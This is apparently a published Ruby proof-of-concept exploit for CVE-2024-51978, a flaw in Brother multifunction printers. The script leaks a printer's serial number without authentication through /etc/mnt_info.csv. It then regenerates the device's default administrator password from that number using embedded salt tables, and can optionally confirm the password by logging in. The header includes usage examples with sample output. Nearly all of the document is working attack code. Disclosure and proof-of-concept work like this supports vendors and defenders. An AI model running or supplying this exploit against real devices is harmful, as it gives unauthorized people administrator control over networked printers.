# ======================================================================================
# CVE-2024-51978: An unauthenticated attacker can generate the device's default password
# ======================================================================================
#
# Verified on the following:
# * Brother MFC-L9570CDW (MAIN: ZL2403011354, SUB1: 1.32)
#
# Example usage:
#   gem install httparty
#   ruby CVE-2024-51978.rb --printer_ip 192.168.86.62
#
#   ruby CVE-2024-51978.rb --printer_ip 192.168.86.62
#   [+] Targeting printer: http://192.168.86.62:80
#   [+] Leaked serial number: ***************
#   [+] Generated default password: r/5LM&U>
#
#   ruby CVE-2024-51978.rb --printer_ip 192.168.86.62 --printer_port 631
#   [+] Targeting printer: http://192.168.86.62:631
#   [+] Leaked serial number: ***************
#   [+] Generated default password: r/5LM&U>
#
#   ruby CVE-2024-51978.rb  --printer_scheme https --printer_ip 192.168.86.62 --printer_port 443
#   [+] Targeting printer: https://192.168.86.62:443
#   [+] Leaked serial number: ***************
#   [+] Generated default password: r/5LM&U>
#
#   ruby CVE-2024-51978.rb --printer_serial ***************
#   [+] Generated default password: r/5LM&U>
# ======================================================================================
require 'httparty'
require 'csv'
require 'optparse'
require 'digest'
require 'base64'

HTTParty::Basement.default_options.update(verify: false)

class BrotherDefaultPassword

	@@salt_lookup_table = [
		0x06, 0x1A, 0x80, 0x93, 0x90, 0x60, 0xA4, 0x18, 0x76, 0xA8, 0xFA, 0x98, 0x58, 0x25, 0x5F, 0xBA,
		0x24, 0xCF, 0xDD, 0xB6, 0xD0, 0xE3, 0x7A, 0x68, 0x41, 0x8B, 0x21, 0x15, 0x7E, 0x65, 0x70, 0x7F,
		0x8C, 0x91, 0x3B, 0xFC, 0x13, 0x4A, 0xBE, 0xD7, 0x6C, 0x99, 0xC3, 0xD1, 0x51, 0x35, 0xDF, 0x23,
		0xB0, 0x3F, 0x3D, 0x16, 0x29, 0xA1, 0x59, 0xCA, 0xA2, 0x5C, 0x43, 0x0B, 0xA5, 0x36, 0xF0, 0xFE,
		0x3E, 0xED, 0xF2, 0xE6, 0xEA, 0x54, 0x66, 0x7D, 0xEE, 0x3C, 0x50, 0xEF, 0x9E, 0xD3, 0xB1, 0xF7,
		0xAC, 0x5A, 0x6E, 0x12, 0x2A, 0x01, 0x46, 0x8F, 0x6B, 0x88, 0x0E, 0x52, 0xF9, 0x81, 0xA0, 0x02,
		0xC1, 0xF1, 0xE9, 0xC2, 0xF6, 0x33, 0xCB, 0xB3, 0x73, 0x17, 0xFD, 0x6F, 0xF4, 0xEC, 0x84, 0xC6,
		0x47, 0xCE, 0x9F, 0xD5, 0x92, 0x85, 0x53, 0x26, 0x27, 0x62, 0xEB, 0xAE, 0x3A, 0x1F, 0x0F, 0x94,
		0x95, 0x82, 0x8E, 0x42, 0x28, 0xB9, 0xBF, 0xAF, 0xD4, 0x48, 0xD9, 0xC5, 0x4C, 0x64, 0x2B, 0x8D,
		0xF8, 0xAA, 0xC4, 0x63, 0x87, 0xE4, 0x1D, 0xA6, 0x14, 0xCD, 0xBB, 0xC0, 0xE5, 0xDA, 0x37, 0xC9,
		0xE8, 0xB8, 0x67, 0xDC, 0x5D, 0xA7, 0xAD, 0x79, 0x44, 0xF3, 0x83, 0xA9, 0x1B, 0x96, 0x89, 0xAB,
		0x45, 0xBC, 0x1C, 0xB4, 0xE1, 0x20, 0x2F, 0x49, 0x22, 0x86, 0xDB, 0x4E, 0xE0, 0x9B, 0x10, 0x19,
		0x97, 0x61, 0x40, 0x78, 0x5E, 0x39, 0xCC, 0x0D, 0x09, 0x9D, 0x34, 0x0C, 0x2E, 0x0A, 0x77, 0x6D,
		0xDE, 0xC7, 0xD8, 0xA3, 0xE2, 0x56, 0xB5, 0x4B, 0x38, 0x74, 0x8A, 0xBD, 0x6A, 0x4F, 0x07, 0x03,
		0x05, 0xFF, 0xF5, 0x31, 0x1E, 0xE7, 0xD2, 0x2D, 0x69, 0xC8, 0x5B, 0xD6, 0x57, 0x75, 0x7C, 0xB2,
		0x72, 0xB7, 0x2C, 0xFB, 0x11, 0x9C, 0x7B, 0x32, 0x55, 0x30, 0x71, 0x04, 0x9A, 0x4D, 0x08, 0x100
	]

	@@salt_data_table = [
		'aiaFrJAn', 'FuUcjKwa', 'cMnDTitZ', 'RuSfzwJC', 'XXrLDVub', 'znimXRSU', 'dLdJgcZf', 'rgm32u2x',
		'7HOLDhk\'', 'ENbuNZVy', 'eCd6Ygyf', 'gmLt2GuL', '5dhjHet3', 'nPtN7h23', '47rdTTV7', 'KAkaSzWh',
		's3m7wwW2', 'wtBGnGjn', 'H3LyF$dd', 'H6EtSew2', 'D9N8iJBB', 'tPT4ZKm3', 'XEEV4tjf', 'zDXx93rw',
		'HKkmbGjD', 'ng5sLECe', 'QrPVDngu', 'LPMhpZe9', 'uLzhjUwc', 'Sa9QBKW2', 'AfrPdj7y', 'ujmt9s72',
		'n8Y7XrFx', '8xeRU7rW', 'RUzpQznp', '%hU5RMxP', 'ipaZKMEW', 'chP5cHCy', 'b5UJabgU', 'WtZsF7VF',
		'xk8wg669', 'gAVynzbw', 'GuRgNxkm', 'UBCAUb85', 'CQgQhyfp', 'fcEegCtB', '5LSpTNPN', 'dzrQdahF',
		'kD4fHLhM', 'mHQ6QAUg', 'TjZ6kiAb', '5SMdwEK6', 'RD2ytHHH', 'XgQHBfBY', '6ZZRVbHx', 'BNDUsFCC',
		'iSwrrtpr', 'ucBFJbGj', 'Nzs7rhKJ', 'uHugTJX5', 'aXN3FsUF', 'uyHDwwUK', 'tbnJTYje', 'SmgfLZ2n',
		'4sXy9D8j', 'YLVSee68', '3U5TbNNS', 'QjYfTBKu', 'T*8AF8dk', 'F8xQDTrW', 'Pyeda62U', '33sghDrE',
		'ThiW9Naz', 'BU9TDd7k', '72sgwM&G', 'VkV+uSUt', 'HpTdi9jL', 'G3AbGyAH', 'zbW8YCSy', 'eKB25SCe',
		'rbzpCtQN', 'EZSRB966', 'nJAxxUbS', '7GZRAG9E', 'PaMCwYGQ', 'TZy2AeYr', 'jMgYEPUT', '6QAepcUc',
		'jdWU9pXy', 'CeZs6T8g', 'jEEDBNPn', 'fCHg4V5W', 'rTUUjyPG', '3L5SNJhr', 'XbXK4Lg9', 'ZcdGAzLH',
		'ANfMJ&6p', 'S4URfyzc', 'Pai9muCn', 'Nei%6NwR', 'BnUWBHg6', 'FwGyWrux', 'mwkuuGXX', 'WR$LK5Qu',
		'Lxs4DgNM', 'KAYMHcKy', 'UnWYeeUp', '2cc3EzeX', '7nVPpdCd', 'LDPgHa9b', 'Yfwsz7zR', 'tGhb9Ych',
		'Gxi4S8jC', 'QEiWU2cm', 'PFhyTxjN', 'LrpTgGLw', 'PUfziDzE', 'ACbmRneN', 'gYmjyNjF', 'RuZctKSS',
		'k8KdHgDB', 'pJEA3hSG', 'X6rbghrk', '9mnbf3up', '4WU2hMHx', 'TgmNEn45', 'zRnQReEn', 'DfsPzxsX',
		'UyScxhhw', 'knEsS3CX', 'xuPUKwFf', 'Ks4nKt2z', 'trBf!b67', 'rhHgt4gX', '2N8sPf#d', 'eFMjhMcB',
		'aWLeRu9M', '4MiN4D63', '5nG9jMGh', 'SA5pnyQ6', 'UnSQ94nx', 'kPjzBBxy', '6CppHT3R', '3VPgRgiL',
		'cP9JJDJr', 'MyMWzUMj', 'xyG4ACEd', 'dbnAbG8e', 'RnHGYc6F', 'ktCQnJWk', 'XBt5Vxr2', 'wH6iY9f9',
		'atB4eri8', '8SdHujf8', 'inLRdn5s', 'Fh3N*pWc', 'Fb3XYtZz', 'GADACWcS', 'r8tsDgph', 'EumHNmFg',
		'rRFKrK2x', 'TQ9nUnNk', 'P5hss6GX', 'mX8ZSQtr', 'BJMjyd7H', 'EC7r5fEm', 'TPjQpDaa', 'SZeMDpfR',
		'XEDJeraW', 'YYNTgsah', '6uupfWF!', '7RcTLwHX', 'ycYr3dwT', '7VwCnTFQ', 'JGF6iigf', 'M72Kea4f',
		'ZxfZWbVb', 'NcT3LGBV', 'HBU68uaa', 'UeHK4pnf', 'sDjzNHHd', 'CGjgeutc', 'PC4JbuC2', 'tNYQc7Xs',
		'RGNsJQhD', 'HKEh2fba', '49x4PLUz', 'N6MLNkY5', 'NrMHeE9d', 'j5NkznV4', 'n8At3YKi', 'ZnHwAEnZ',
		'3LnUmF8E', 'RBXzdUpA', 'FwGHBVej', '3wkkik7E', 'fpyGnp2u', 'ANBwfiPb', 'Ztt8X9zG', '47K7QWix',
		'TzJfUdNY', 'hpD?MEAm', 'sJRh4Jni', 'TyQUgEEH', 'FBJnWWwx', '7cN3GH6e', 'hWQhzFTN', 'GamDhsgZ',
		'yXM4cZKt', '9BJPKtaC', 'NVNpe4kJ', 'uSyxGxbz', 'h5zTpV3U', 'TAajcQ4h', 'VjYMEusS', 'Wpj237VG',
		'yAjHYVVV', 'Hb6k7Cwe', 'yZbuDBEi', 'S4wpBmZM', 'DwFra8wk', 'j#Pk5r9W', 'PjkfS9WB', 'gHf3YGA3',
		'ihDtdUCu', 'KARzJDfR', 'M7fApB5U', 'MiD44gRC', 'RdEM8y5W', '4GsGuPag', 'pETQc4k2', 'pZZu7Ras',
		'AJReAUBy', 'EAMmQsWe', 'BeC2XJi8', 'PujT2eRf', '2UXLeAJu', 'hMPbY3MQ', 'QeawRP*p', 'SbCbW9Tf',
		'EhNNtLyj', 'B8RjceGs', 'LaydmLeD', 'JFR7T47f', 'WCbAdTfm', 'srN9gNSE', 'gAn7h8Yp', '4PnTKVse',
		'HDxGwLsN', 'tR8XUSRg', 'wLe-3Xf8', 'zH7cpxsd', 'tCc5sWFX', '3hzTj5BS', 'hLK6f&g4', 'tCzzSsm7'
	]

	def initialize(options)
		@options = options
	end

	def main
		
		unless @options[:printer_serial]
			$stdout.puts "[+] Targeting printer: #{make_uri()}"

			serial_number = get_serial_number

			return unless serial_number

			$stdout.puts "[+] Leaked serial number: #{serial_number}"
		else
			serial_number = @options[:printer_serial]
		end

		default_password = generate_default_password(serial_number)

		return unless default_password

		$stdout.puts "[+] Generated default password: #{default_password}"
		
		if @options[:validate_password]
			$stdout.puts "[+] Validating password: #{ validate_password(default_password) == true ? 'Success' : 'Failed' }"
		end
	end

	def make_uri(path='')
		"#{@options[:printer_scheme]}://#{@options[:printer_ip]}:#{@options[:printer_port]}#{path}"
	end

	def get_serial_number
		response = HTTParty.get(make_uri(@options[:mnt_info_path]))

		return nil unless response&.body

		csv = CSV.new(response.body)

		serial_number_index = nil

		csv.each do |row|
			if serial_number_index.nil?
				serial_number_index = row.index('Serial No.')
			else
				return row[serial_number_index]
			end
		end

		nil
	end

	def generate_default_password(serial, salt_lookup_index=254, salt_data=nil)

		unless salt_data && salt_lookup_index != 0
			salt_table_index = @@salt_lookup_table[salt_lookup_index];

			salt_data = salt_data || @@salt_data_table[salt_table_index].unpack('C*')
		end

		buff = serial[0..15]

		buff << [
			salt_data[7] - 1,
			salt_data[6] - 1,
			salt_data[5] - 1,
			salt_data[4] - 1,
			salt_data[3] - 1,
			salt_data[2] - 1,
			salt_data[1] - 1,
			salt_data[0] - 1
		].pack('C*')

		digest = Digest::SHA256.digest(buff)

		hash = Base64::encode64(digest)

		result = ''

		0.upto(7) do |idx|
			c = hash[idx]

			case c
			when 'l'
				result << '#'
			when 'I'
				result << '$'
			when 'z'
				result << '%'
			when 'Z'
				result << '&'
			when 'b'
				result << '*'
			when 'q'
				result << '-'
			when 'O'
				result << ':'
			when 'o'
				result << '?'
			when 'v'
				result << '@'
			when 'y'
				result << '>'
			else
				result << c
			end
		end

		result
	end
	
	def validate_password(password)

		response = HTTParty.get(make_uri(@options[:login_path]))
		if response&.code != 200
			$stdout.puts("[-] Request to '#{make_uri(@options[:login_path])}' failed (#{response&.code}).")
			return nil
		end

		m = response.body.match(/input type="password" id="LogBox" name="([a-zA-Z0-9]+)"/)
		if m.nil?
			$stdout.puts("[-] Failed to extract login form password name.")
			return nil
		end

		data = {
			m[1] => password,
			'loginurl' => @options[:login_path],
		}

		response = HTTParty.post(
			make_uri(@options[:login_path]),
			body: URI.encode_www_form(data),
			headers: {
				'Content-Type' => 'application/x-www-form-urlencoded'
			}
		)

		if response&.code != 200
			$stdout.puts("[-] Request to '#{make_uri(@options[:login_path])}' failed (#{response&.code}).")
			return nil
		end

		m = response.headers['Set-Cookie'].to_s.match(/AuthCookie=([a-zA-Z0-9\%\/\+\=\-\r\n]+);/)
		if m.nil?
			return nil
		end

		true
	end
end

options = {
	printer_scheme: 'http',
	printer_ip: nil,
	printer_port: 80,
	printer_serial: nil,
	validate_password: false,
	mnt_info_path: '/etc/mnt_info.csv',
	login_path: '/general/status.html',
}

OptionParser.new do |opt|
  opt.on('--printer_scheme http') { |o| options[:printer_scheme] = o }
  opt.on('--printer_ip IP') { |o| options[:printer_ip] = o }
  opt.on('--printer_port PORT') { |o| options[:printer_port] = o.to_i }
  opt.on('--printer_serial SERIAL') { |o| options[:printer_serial] = o }
  opt.on('--validate_password') { |o| options[:validate_password] = true }
  opt.on('--mnt_info_path PATH') { |o| options[:mnt_info_path] = o }
  opt.on('--login_path PATH') { |o| options[:login_path] = o }
end.parse!

if options[:printer_ip].nil? && options[:printer_serial].nil?
	$stderr.puts("You must specify either a target printer IP via --printer_ip or a serial number via --printer_serial")
	Kernel.exit -1
end

if options[:validate_password] && options[:printer_ip].nil?
	$stderr.puts("You must specify a target printer IP via --printer_ip")
	Kernel.exit -1
end

BrotherDefaultPassword.new(options).main